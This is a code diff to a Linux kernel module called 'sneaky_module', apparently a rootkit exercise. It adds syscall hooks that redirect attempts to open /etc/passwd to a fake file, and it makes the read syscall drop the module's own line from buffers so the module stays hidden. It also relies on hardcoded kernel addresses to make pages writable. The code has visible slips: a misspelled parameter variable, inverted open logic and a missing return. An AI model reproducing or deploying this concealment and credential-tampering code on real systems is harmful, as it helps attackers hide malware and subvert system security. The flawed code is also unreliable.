@@ -7,6 +7,7 @@
 #include <linux/kallsyms.h>
 #include <linux/kernel.h> // for printk and other kernel bits
 #include <linux/module.h> // for all modules
+#include <linux/moduleparam.h>
 #include <linux/sched.h>
 
 #define read_cr0() (native_read_cr0())
@@ -15,6 +16,7 @@
 #define SNEAKY_PREFIX_SIZE (sizeof(SNEAKY_PREFIX) - 1)
 #define SNEAKY_MODULE "sneaky_module"
 #define SNEAKY_MODULE_SIZE (sizeof(SNEAKY_MODULE) - 1)
+
 #define handle_error(msg)                                                      \
   do {                                                                         \
     perror(msg);                                                               \
@@ -28,7 +30,13 @@ struct linux_dirent {
   char d_name[1];
 };
 
+static char *sneady_pid = "0";
+module_param(sneaky_pid, charp,
+             S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);
+
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Haili Wu");
+MODULE_DESCRIPTION("You can not see me.");
 
 void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
 void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
@@ -40,13 +48,13 @@ asmlinkage long (*original_getdents)(unsigned int fd,
                                      struct linux_dirent *dirent,
                                      unsigned int count);
 asmlinkage int (*original_read)(int fd, void *buf, size_t count);
-asmlinkage int (*original_close)(int fd);
 
-// Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  if (strcmp())
-    return original_call(pathname, flags);
+
+  printk(KERN_ALERT
+         "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");
+  if (strcmp(pathname, REAL_PWD))
+    return original_open(FAKE_OPEN, flags);
 }
 
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
@@ -82,9 +90,29 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 
 asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count) {
   int ori_value = original_read(fd, buf, count);
+  char *sneaky_line = NULL;
+  char *sneaky_line_end = NULL;
+
+  // search in buf to see whether SNEAKY_MODULE is inside it
+  sneaky_line = strnstr(buf, SNEAKY_MODULE, ori_value);
+  if (sneaky_line != NULL) {
+    // find SNEAKY_MODULE
+    for (sneaky_line_end = sneaky_line; sneaky_line_end < (buf + ori_value);
+         sneaky_line_end++) {
+      if (*sneaky_line_end == '\n') {
+        sneaky_line_end++; // comes to the end of next line
+        break;
+      }
+    }
+    // cover the SNEAKY_MODULE line
+    memcpy(sneaky_line, sneaky_line_end, (buf + ori_value) - sneaky_line_end);
+    // adjust the size of the return buffer's length
+    ori_value -= (int)(sneaky_line_end - sneaky_line);
+  }
+
+  return ori_value;
 }
-asmlinkage int sneaky_sys_close(int fd) {}
-// The code that gets executed when the module is loaded
+
 static int initialize_sneaky_module(void) {
   struct page *page_ptr;
 
